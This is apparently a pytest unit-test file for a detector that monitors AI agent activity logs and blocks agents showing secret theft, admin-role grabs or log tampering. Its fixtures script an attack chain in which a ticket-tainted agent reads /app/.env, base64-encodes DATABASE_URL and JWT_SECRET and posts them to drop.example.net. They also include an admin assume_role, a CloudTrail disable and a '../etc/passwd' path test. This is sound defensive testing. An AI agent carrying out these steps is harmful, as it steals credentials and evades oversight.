"""detection.loop.Detector with a scripted FakeCH and an httpx.MockTransport fake checkpoint.

No ClickHouse, no sockets, no model calls. Run: uv run pytest tests/unit/test_detector_loop.py -q
"""

from __future__ import annotations

import asyncio
import json
import math
import time
from typing import Any

import httpx
import pytest
from typer.testing import CliRunner

from detection import loop as L
from detection.loop import CheckpointHTTP, Detector, local_rule_verdict
from detection.metrics import RollingSamples, Timer, make_heartbeat
from detection.sql_loader import SENTINEL_AGENT, available_sql, load_sql, watermark_params
from tripwire.contracts import QuickCheckInput, Verdict

AGENT = "deploy-bot"
OTHER = "support-bot"
T0 = 1_791_569_120_000
SQL_NAMES = ("funnel", "recent_events", "baseline", "role_grab", "log_tamper")


def _ev(ts_ms: int, action: str, target: str, is_external: int = 0, result: str = "ok") -> dict[str, Any]:
    return {
        "ts_ms": ts_ms,
        "action": action,
        "target": target,
        "bytes": 100,
        "is_external": is_external,
        "result": result,
        "reason": "",
        "tainted_by": "ticket:4821" if ts_ms > T0 else "",
        "session_id": "s-1",
        "code_ref": "agents/fake_tools.py:10",
    }


ATTACK_EVENTS = [
    _ev(T0, "read_file", "ticket:4821"),
    _ev(T0 + 900, "read_file", "/app/.env"),
    _ev(T0 + 1800, "run_command", "grep -E '^(DATABASE_URL|JWT_SECRET)=' /app/.env | base64 -w0"),
    _ev(T0 + 2700, "http_post", "https://drop.example.net/upload", is_external=1),
]
LAST = T0 + 2700
FUNNEL_HIT = {"agent_id": AGENT, "last_step_ts_ms": LAST, "first_step_ts_ms": T0 + 900, "n_events": 4}

MALICIOUS = Verdict(
    verdict="malicious",
    confidence=0.95,
    reason="model: secret read, encoded and posted to an unknown host",
    decision_source="akashml",
    model_ids=["akash/test-small"],
    latency_ms=120.0,
    tokens_in=300,
    tokens_out=20,
)
BENIGN = Verdict(
    verdict="benign",
    confidence=0.6,
    reason="model: looks like normal deploy work",
    decision_source="akashml",
    model_ids=["akash/test-small"],
)


# ---------------------------------------------------------------------------
# fakes
# ---------------------------------------------------------------------------


class FakeCH:
    """Scripted rows per SQL name (list, callable(parameters) -> list, or an Exception to raise)."""

    def __init__(self, scripts: dict[str, Any] | None = None) -> None:
        self.scripts: dict[str, Any] = dict(scripts or {})
        self.calls: list[tuple[str, dict[str, Any]]] = []
        self.last_summary: dict[str, Any] = {"read_rows": 4}

    async def query(self, sql: str, parameters: dict[str, Any] | None = None) -> list[dict[str, Any]]:
        name = next((n for n in SQL_NAMES if f"detection/sql/{n}.sql" in sql), None)
        assert name is not None, f"unexpected SQL: {sql[:80]!r}"
        self.calls.append((name, dict(parameters or {})))
        script = self.scripts.get(name, [])
        if isinstance(script, Exception):
            raise script
        if callable(script):
            return script(parameters or {})
        return [dict(r) for r in script]

    def names(self) -> list[str]:
        return [n for n, _ in self.calls]


class FakeCheckpoint:
    """httpx.MockTransport handler that records requests and serves /status, /block, /alerts, /heartbeat."""

    def __init__(
        self,
        blocked: list[str] | None = None,
        verdict_keys: list[str] | None = None,
        watermarks: dict[str, int] | None = None,
        block_status: int = 200,
        alert_status: int = 200,
        down: bool = False,
    ) -> None:
        self.blocked = list(blocked or [])
        self.verdict_keys = list(verdict_keys or [])
        self.watermarks = dict(watermarks or {})
        self.block_status = block_status
        self.alert_status = alert_status
        self.down = down
        self.requests: list[tuple[str, str, Any, dict[str, str]]] = []

    def handler(self, request: httpx.Request) -> httpx.Response:
        if self.down:
            raise httpx.ConnectError("connection refused", request=request)
        body = json.loads(request.content) if request.content else None
        path = request.url.path
        self.requests.append((request.method, path, body, dict(request.headers)))
        if request.method == "GET" and path == "/status":
            return httpx.Response(
                200,
                json={
                    "active": [AGENT, OTHER],
                    "blocked": self.blocked,
                    "open_incidents": [],
                    "watermarks": self.watermarks,
                    "modes": {},
                    "verdict_keys": self.verdict_keys,
                    "hold_enabled": False,
                    "policy_version": 1,
                },
            )
        if request.method == "POST" and path.startswith("/block/"):
            if self.block_status == 409:
                return httpx.Response(409, json={"detail": "duplicate alert", "reason": "duplicate"})
            return httpx.Response(self.block_status, json={"status": "blocked", "incident_id": "inc-test"})
        if request.method == "POST" and path == "/alerts":
            return httpx.Response(self.alert_status, json={"status": "recorded", "key": "k"})
        if request.method == "POST" and path == "/heartbeat":
            return httpx.Response(200, json={"status": "ok"})
        return httpx.Response(404, json={"detail": "not found"})

    def client(self) -> CheckpointHTTP:
        return CheckpointHTTP("http://checkpoint.test", "test-token", transport=httpx.MockTransport(self.handler))

    def posts(self, prefix: str) -> list[Any]:
        return [body for m, p, body, _ in self.requests if m == "POST" and p.startswith(prefix)]


def scripted(verdict: Verdict | Exception | None = None, delay_s: float = 0.0):
    calls: list[QuickCheckInput] = []

    async def classify(inp: QuickCheckInput) -> Verdict:
        calls.append(inp)
        if delay_s:
            await asyncio.sleep(delay_s)
        if isinstance(verdict, Exception):
            raise verdict
        assert verdict is not None
        return verdict

    classify.calls = calls  # type: ignore[attr-defined]
    return classify


async def rule_classify(inp: QuickCheckInput) -> Verdict:
    return local_rule_verdict(inp)


def make(ch: FakeCH, cp: FakeCheckpoint, classify, **kw) -> Detector:
    return Detector(ch, cp.client(), classify, fallback=local_rule_verdict, **kw)


def attack_ch(**extra: Any) -> FakeCH:
    return FakeCH({"funnel": [FUNNEL_HIT], "recent_events": ATTACK_EVENTS, **extra})


# ---------------------------------------------------------------------------
# Detector.run_once
# ---------------------------------------------------------------------------


async def test_malicious_verdict_posts_block_with_alert_payload():
    ch, cp, classify = attack_ch(), FakeCheckpoint(), scripted(MALICIOUS)
    d = make(ch, cp, classify)
    before = L.now_ms()
    summary = await d.run_once()

    assert summary["error"] is None and summary["hits"] == 1 and summary["blocks"] == 1 and summary["alerts"] == 0
    blocks = [(p, body, h) for m, p, body, h in cp.requests if m == "POST" and p.startswith("/block/")]
    assert len(blocks) == 1
    path, body, headers = blocks[0]
    assert path == f"/block/{AGENT}"
    assert headers["x-tripwire-token"] == "test-token"
    assert body["agent_id"] == AGENT
    assert body["rule"] == "secret_theft"
    assert body["verdict"] == "malicious" and body["confidence"] == pytest.approx(0.95)
    assert body["decision_source"] == "akashml"
    assert body["model_ids"] == ["akash/test-small"]
    assert body["reason"] == MALICIOUS.reason
    assert body["last_step_ts_ms"] == LAST
    assert body["detected_at_ms"] >= LAST and body["detected_at_ms"] >= before
    assert cp.posts("/alerts") == []
    assert summary["classify_source"] == "akashml" and summary["classify_latency_ms"] is not None
    # classify saw the agent's recent rows, oldest first, with the funnel context
    (inp,) = classify.calls
    assert inp.agent_id == AGENT and inp.rule == "secret_theft"
    assert inp.events == ATTACK_EVENTS
    assert "funnel matched" in inp.context and str(LAST) in inp.context
    # every request carried the token (harmless when PUBLIC=0, required when PUBLIC=1)
    assert all(h.get("x-tripwire-token") == "test-token" for _, _, _, h in cp.requests)


async def test_benign_verdict_posts_alert_with_agent_id_in_body():
    cp = FakeCheckpoint()
    d = make(attack_ch(), cp, scripted(BENIGN))
    summary = await d.run_once()
    assert summary["blocks"] == 0 and summary["alerts"] == 1
    assert cp.posts("/block/") == []
    (alert,) = cp.posts("/alerts")
    assert alert["agent_id"] == AGENT and alert["verdict"] == "benign" and alert["rule"] == "secret_theft"
    assert alert["decision_source"] == "akashml" and alert["last_step_ts_ms"] == LAST


async def test_malicious_below_threshold_is_an_alert_not_a_block():
    low = MALICIOUS.model_copy(update={"confidence": 0.7})
    cp = FakeCheckpoint()
    await make(attack_ch(), cp, scripted(low), threshold=0.8).run_once()
    assert cp.posts("/block/") == [] and len(cp.posts("/alerts")) == 1


async def test_blocked_agent_is_skipped_without_classify():
    ch, cp, classify = attack_ch(), FakeCheckpoint(blocked=[AGENT]), scripted(MALICIOUS)
    summary = await make(ch, cp, classify).run_once()
    assert summary["hits"] == 1 and summary["skipped"] == 1 and summary["blocks"] == 0
    assert classify.calls == []
    assert "recent_events" not in ch.names()
    assert cp.posts("/block/") == [] and cp.posts("/alerts") == []


async def test_key_already_in_verdict_keys_is_skipped():
    key = f"{AGENT}|secret_theft|{LAST}"
    cp, classify = FakeCheckpoint(verdict_keys=[key]), scripted(MALICIOUS)
    summary = await make(attack_ch(), cp, classify).run_once()
    assert summary["skipped"] == 1 and classify.calls == []
    assert cp.posts("/block/") == [] and cp.posts("/alerts") == []


async def test_same_hit_is_not_reposted_on_the_next_run():
    cp, classify = FakeCheckpoint(), scripted(MALICIOUS)
    d = make(attack_ch(), cp, classify)
    first = await d.run_once()
    second = await d.run_once()  # /status still does not list the key: the local seen set must dedup
    assert first["blocks"] == 1 and second["blocks"] == 0 and second["skipped"] == 1
    assert len(cp.posts("/block/")) == 1 and len(classify.calls) == 1
    assert f"{AGENT}|secret_theft|{LAST}" in d.seen


async def test_409_is_logged_and_key_remembered():
    cp = FakeCheckpoint(block_status=409)
    d = make(attack_ch(), cp, scripted(MALICIOUS))
    summary = await d.run_once()  # must not raise
    assert summary["error"] is None and summary["conflicts"] == 1 and summary["blocks"] == 0
    assert f"{AGENT}|secret_theft|{LAST}" in d.seen
    again = await d.run_once()
    assert again["skipped"] == 1 and len(cp.posts("/block/")) == 1


async def test_classify_exception_falls_back_to_rule_only_block():
    cp = FakeCheckpoint()
    summary = await make(attack_ch(), cp, scripted(RuntimeError("model API 500"))).run_once()
    assert summary["blocks"] == 1 and summary["fallbacks"] == 1 and summary["classify_source"] == "rule_only"
    (body,) = cp.posts("/block/")
    assert body["decision_source"] == "rule_only"
    assert body["reason"].startswith("model unavailable: rule: ")
    assert body["model_ids"] == [] and body["confidence"] == pytest.approx(0.9)


async def test_classify_slower_than_budget_falls_back_to_rule_only():
    cp = FakeCheckpoint()
    d = make(attack_ch(), cp, scripted(MALICIOUS, delay_s=0.5), classify_timeout_s=0.05)
    t0 = time.perf_counter()
    summary = await d.run_once()
    assert time.perf_counter() - t0 < 0.45  # did not wait for the slow model
    assert summary["blocks"] == 1 and summary["fallbacks"] == 1
    (body,) = cp.posts("/block/")
    assert body["decision_source"] == "rule_only" and body["reason"].startswith("model unavailable: ")


async def test_fallback_benign_when_recent_rows_lack_the_chain():
    # model down + the agent's recent rows do not contain the chain -> rule says benign -> /alerts, no block
    ch = FakeCH({"funnel": [FUNNEL_HIT], "recent_events": ATTACK_EVENTS[:2]})
    cp = FakeCheckpoint()
    summary = await make(ch, cp, scripted(RuntimeError("down"))).run_once()
    assert summary["blocks"] == 0 and summary["alerts"] == 1
    (alert,) = cp.posts("/alerts")
    assert alert["decision_source"] == "rule_only" and alert["verdict"] == "benign"


async def test_heartbeat_posted_every_run_with_funnel_timing():
    cp = FakeCheckpoint()
    d = make(attack_ch(), cp, scripted(MALICIOUS))
    await d.run_once()
    await d.run_once()
    beats = cp.posts("/heartbeat")
    assert len(beats) == 2
    for i, hb in enumerate(beats, start=1):
        assert hb["source"] == "detector"
        assert "funnel" in hb["query_timings_ms"] and hb["query_timings_ms"]["funnel"] >= 0
        assert hb["metrics"]["iteration"] == i
        assert hb["metrics"]["rules"] == ["secret_theft"]
    assert "recent_events" in beats[0]["query_timings_ms"]  # a hit was classified on the first run
    assert beats[0]["metrics"]["blocks"] == 1 and beats[1]["metrics"]["skipped"] == 1
    assert beats[0]["metrics"]["classify_source"] == "akashml"


async def test_clickhouse_error_returns_summary_and_does_not_raise():
    ch = FakeCH({"funnel": RuntimeError("Code: 210. Connection refused")})
    cp, classify = FakeCheckpoint(), scripted(MALICIOUS)
    summary = await make(ch, cp, classify).run_once()
    assert summary["error"] and "clickhouse funnel" in summary["error"] and "Connection refused" in summary["error"]
    assert summary["hits"] == 0 and classify.calls == []
    (hb,) = cp.posts("/heartbeat")  # the heartbeat still reports the failure
    assert hb["metrics"]["error"] == summary["error"] and hb["query_timings_ms"] == {}


async def test_checkpoint_down_returns_summary_and_does_not_raise():
    ch = attack_ch()
    summary = await make(ch, FakeCheckpoint(down=True), scripted(MALICIOUS)).run_once()
    assert summary["error"] and summary["error"].startswith("checkpoint /status")
    assert ch.calls == []  # nothing queried without the status view


async def test_checkpoint_post_failure_is_retried_next_run_without_reclassify():
    cp, ch, classify = FakeCheckpoint(), attack_ch(), scripted(MALICIOUS)
    d = make(ch, cp, classify, retry_after_s=0)
    original = cp.handler

    def flaky(request: httpx.Request) -> httpx.Response:
        if request.url.path.startswith("/block/"):
            raise httpx.ReadTimeout("slow", request=request)
        return original(request)

    d.checkpoint = CheckpointHTTP("http://checkpoint.test", "t", transport=httpx.MockTransport(flaky))
    first = await d.run_once()
    key = f"{AGENT}|secret_theft|{LAST}"
    assert first["http_errors"] == 1 and key not in d.seen and key in d._pending
    d.checkpoint = cp.client()
    second = await d.run_once()
    assert second["blocks"] == 1 and second["retries"] == 1 and key in d.seen and key not in d._pending
    # the verdict was decided once: no second recent_events query, no second classify call
    assert len(classify.calls) == 1 and ch.names().count("recent_events") == 1
    (body,) = cp.posts("/block/")
    assert body["decision_source"] == "akashml" and body["last_step_ts_ms"] == LAST


async def test_http_error_status_keeps_the_verdict_and_resends_it():
    """401 (token mismatch under PUBLIC=1) or 5xx must not drop the containment for that attack."""
    for status in (401, 503):
        cp, ch, classify = FakeCheckpoint(block_status=status), attack_ch(), scripted(MALICIOUS)
        d = make(ch, cp, classify, retry_after_s=0)
        first = await d.run_once()
        key = f"{AGENT}|secret_theft|{LAST}"
        assert first["http_errors"] == 1 and first["blocks"] == 0 and key not in d.seen
        cp.block_status = 200  # checkpoint fixed / back up
        second = await d.run_once()
        assert second["blocks"] == 1 and second["retries"] == 1 and key in d.seen, status
        assert len(classify.calls) == 1 and ch.names().count("recent_events") == 1
        bodies = cp.posts("/block/")
        assert len(bodies) == 2 and bodies[0] == bodies[1]  # the same decided payload, re-sent as-is
        hb = cp.posts("/heartbeat")[-1]
        assert hb["metrics"]["retries"] == 1 and hb["metrics"]["pending"] == 0


async def test_pending_verdict_waits_for_the_backoff():
    cp, classify = FakeCheckpoint(block_status=503), scripted(MALICIOUS)
    d = make(attack_ch(), cp, classify, retry_after_s=60)
    await d.run_once()
    cp.block_status = 200
    second = await d.run_once()  # inside the backoff: nothing sent, nothing re-classified
    assert second["skipped"] == 1 and second["retries"] == 0 and len(cp.posts("/block/")) == 1
    assert len(classify.calls) == 1


async def test_pending_verdict_dropped_when_checkpoint_already_has_the_key():
    cp = FakeCheckpoint(block_status=503)
    d = make(attack_ch(), cp, scripted(MALICIOUS), retry_after_s=0)
    await d.run_once()
    key = f"{AGENT}|secret_theft|{LAST}"
    assert key in d._pending
    cp.verdict_keys.append(key)  # e.g. hold mode recorded it meanwhile
    cp.block_status = 200
    second = await d.run_once()
    assert second["skipped"] == 1 and key not in d._pending and len(cp.posts("/block/")) == 1


async def test_watermarks_and_window_are_passed_to_every_query():
    cp = FakeCheckpoint(watermarks={AGENT: 5, OTHER: 7})
    ch = attack_ch()
    await make(ch, cp, scripted(BENIGN), window_s=120).run_once()
    assert ch.calls[0] == ("funnel", {"ids": [AGENT, OTHER], "wms": [5, 7], "window_s": 120})
    assert ch.calls[1] == ("recent_events", {"agent": AGENT, "wm": 5, "window_s": 120})
    cp2, ch2 = FakeCheckpoint(), attack_ch()
    await make(ch2, cp2, scripted(BENIGN)).run_once()
    assert ch2.calls[0][1] == {"ids": [SENTINEL_AGENT], "wms": [0], "window_s": 300}


async def test_hit_at_or_below_watermark_is_skipped_defensively():
    cp, classify = FakeCheckpoint(watermarks={AGENT: LAST}), scripted(MALICIOUS)
    summary = await make(attack_ch(), cp, classify).run_once()
    assert summary["skipped"] == 1 and classify.calls == []


async def test_optional_rules_alert_or_block_by_rule():
    events_by_agent = {
        AGENT: ATTACK_EVENTS,
        OTHER: [_ev(T0, "read_file", "ticket:1042"), _ev(T0 + 500, "assume_role", "arn:aws:iam::1:role/admin")],
    }
    ch = FakeCH(
        {
            "funnel": [],
            "baseline": [
                {"agent_id": AGENT, "action": "http_post", "target": "https://new.example.org/a", "ts_ms": T0 + 10},
                {"agent_id": AGENT, "action": "http_post", "target": "https://new.example.org/b", "ts_ms": T0 + 20},
            ],
            "role_grab": [{"agent_id": OTHER, "ts_ms": T0 + 500, "target": "arn:aws:iam::1:role/admin"}],
            "log_tamper": [],
            "recent_events": lambda p: events_by_agent[p["agent"]],
        }
    )
    cp = FakeCheckpoint()
    rules = ("secret_theft", "baseline_novelty", "role_grab", "log_tamper")
    summary = await make(ch, cp, rule_classify, rules=rules).run_once()
    assert summary["hits"] == 2 and summary["alerts"] == 1 and summary["blocks"] == 1
    (alert,) = cp.posts("/alerts")
    assert alert["agent_id"] == AGENT and alert["rule"] == "baseline_novelty" and alert["verdict"] == "uncertain"
    assert alert["last_step_ts_ms"] == T0 + 20  # two novel rows collapse to one hit keyed by the newest
    (block,) = cp.posts("/block/")
    assert block["agent_id"] == OTHER and block["rule"] == "role_grab" and block["decision_source"] == "rule_only"
    assert block["confidence"] == pytest.approx(0.85)
    (hb,) = cp.posts("/heartbeat")
    assert set(hb["query_timings_ms"]) == {"funnel", "baseline", "role_grab", "log_tamper", "recent_events"}
    assert hb["metrics"]["rules"] == list(rules)


def test_unknown_rule_rejected():
    with pytest.raises(ValueError, match="unknown rules"):
        Detector(FakeCH(), FakeCheckpoint().client(), scripted(BENIGN), rules=("secret_theft", "bogus"))


async def test_run_forever_survives_errors_and_can_be_cancelled():
    ch = FakeCH({"funnel": RuntimeError("down")})
    d = make(ch, FakeCheckpoint(), scripted(MALICIOUS))
    task = asyncio.create_task(d.run_forever(interval=0.01))
    await asyncio.sleep(0.12)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task
    assert d.iteration >= 3


# ---------------------------------------------------------------------------
# fallback rule, resolvers, metrics, sql loader, CLI
# ---------------------------------------------------------------------------


def _qc(rule: str, events: list[dict[str, Any]]) -> QuickCheckInput:
    return QuickCheckInput(agent_id=AGENT, rule=rule, events=events)


def test_local_rule_verdict_matches_the_frozen_contract():
    v = local_rule_verdict(_qc("secret_theft", ATTACK_EVENTS))
    assert (v.verdict, v.confidence, v.decision_source) == ("malicious", 0.9, "rule_only")
    assert v.reason.startswith("rule: ")
    assert local_rule_verdict(_qc("secret_theft", ATTACK_EVENTS[:3])).verdict == "benign"  # no external post
    assert local_rule_verdict(_qc("hold", ATTACK_EVENTS[:3])).verdict == "malicious"  # hold: no post needed
    internal = ATTACK_EVENTS[:3] + [_ev(T0 + 2700, "http_post", "https://api.internal.example/v1/x", 0)]
    assert local_rule_verdict(_qc("secret_theft", internal)).verdict == "benign"
    late = [_ev(T0, "read_file", "/app/.env"), _ev(T0 + 61_000, "run_command", "base64 -w0 /app/.env")]
    assert local_rule_verdict(_qc("hold", late)).verdict == "benign"
    reversed_ = [_ev(T0, "run_command", "base64 x"), _ev(T0 + 100, "read_file", "/app/.env")]
    assert local_rule_verdict(_qc("hold", reversed_)).verdict == "benign"
    assert local_rule_verdict(_qc("baseline_novelty", ATTACK_EVENTS)).verdict == "uncertain"
    role = [_ev(T0, "assume_role", "arn:aws:iam::1:role/admin")]
    assert (local_rule_verdict(_qc("role_grab", role)).verdict, local_rule_verdict(_qc("role_grab", role)).confidence) == ("malicious", 0.85)
    assert local_rule_verdict(_qc("role_grab", ATTACK_EVENTS)).verdict == "benign"
    tamper = [_ev(T0, "disable_logging", "cloudtrail")]
    assert local_rule_verdict(_qc("log_tamper", tamper)).verdict == "malicious"
    assert local_rule_verdict(_qc("log_tamper", role)).verdict == "benign"


def test_resolvers_never_call_a_model_and_always_return_callables():
    classify, label = L.resolve_classify()
    assert callable(classify) and isinstance(label, str) and label
    rule_fn, rule_label = L.resolve_rule_fallback()
    assert callable(rule_fn) and rule_label in ("ai.rules.rule_verdict", "detection.loop.local_rule_verdict")


def test_timer_and_rolling_samples():
    with Timer() as t:
        time.sleep(0.01)
    assert 8 <= t.ms < 1000
    s = RollingSamples(maxlen=1000)
    assert s.p50 is None and s.p95 is None and len(s) == 0
    for i in range(1, 101):
        s.add(float(i))
    assert (s.p50, s.p95, s.last) == (50.0, 95.0, 100.0)  # nearest-rank
    s.add(float("nan"))
    assert len(s) == 100
    small = RollingSamples(maxlen=3)
    for v in (5.0, 1.0, 9.0, 7.0):
        small.add(v)
    assert small.percentile(0.5) == 7.0 and small.percentile(1.0) == 9.0


def test_make_heartbeat_keeps_only_finite_non_negative_timings():
    hb = make_heartbeat("detector", {"funnel": 3.14159, "bad": "x", "neg": -1, "nan": math.nan}, iteration=1, rules=["secret_theft"])
    assert hb.source == "detector" and hb.query_timings_ms == {"funnel": 3.142}
    assert hb.metrics == {"iteration": 1, "rules": ["secret_theft"]}
    json.dumps(hb.model_dump())  # serialisable for POST /heartbeat


def test_sql_files_exist_and_follow_the_contract():
    assert set(SQL_NAMES) <= set(available_sql())
    funnel = load_sql("funnel")
    assert "windowFunnel(60000)(" in funnel and "toUInt64(toUnixTimestamp64Milli(ts))" in funnel
    assert "transform(agent_id, {ids:Array(String)}, {wms:Array(Int64)}, toInt64(0))" in funnel
    assert "synthetic = 0" in funnel and "{window_s:UInt32}" in funnel and "maxIf(" in funnel and "minIf(" in funnel
    for name in ("baseline", "role_grab", "log_tamper"):
        sql = load_sql(name)
        assert "{ids:Array(String)}" in sql and "{wms:Array(Int64)}" in sql and "synthetic = 0" in sql
    assert "LEFT ANTI JOIN" in load_sql("baseline")
    recent = load_sql("recent_events")
    for p in ("{agent:String}", "{wm:Int64}", "{window_s:UInt32}", "LIMIT 100", "code_ref"):
        assert p in recent
    assert load_sql("funnel") is load_sql("funnel")  # cached
    with pytest.raises(ValueError):
        load_sql("../etc/passwd")
    with pytest.raises(FileNotFoundError):
        load_sql("does_not_exist")


def test_watermark_params_sentinel_and_order():
    assert watermark_params({}) == {"ids": [SENTINEL_AGENT], "wms": [0]}
    assert watermark_params(None) == {"ids": [SENTINEL_AGENT], "wms": [0]}
    assert watermark_params({"b": 2, "a": "1"}) == {"ids": ["a", "b"], "wms": [1, 2]}


def test_cli_rejects_bad_arguments_and_once_exits_1_when_checkpoint_is_unreachable():
    runner = CliRunner()
    bad = runner.invoke(L.app, ["--rules", "secret_theft,bogus"])
    assert bad.exit_code == 2 and "unknown rules" in (bad.output or "")
    for args in (["--window-s", "0"], ["--threshold", "1.5"], ["--interval", "0"], ["--rules", " "]):
        res = runner.invoke(L.app, args + ["--once", "--checkpoint-url", "http://127.0.0.1:18999"])
        assert res.exit_code == 2, (args, res.output)
    # nothing listens on this throwaway port: --once must still print the summary, and exit 1 (error reported)
    res = runner.invoke(L.app, ["--once", "--checkpoint-url", "http://127.0.0.1:18999"])
    assert res.exit_code == 1, res.output
    out = res.stdout
    summary = json.loads(out[out.index("{") :])
    assert summary["iteration"] == 1 and summary["error"].startswith("checkpoint /status")
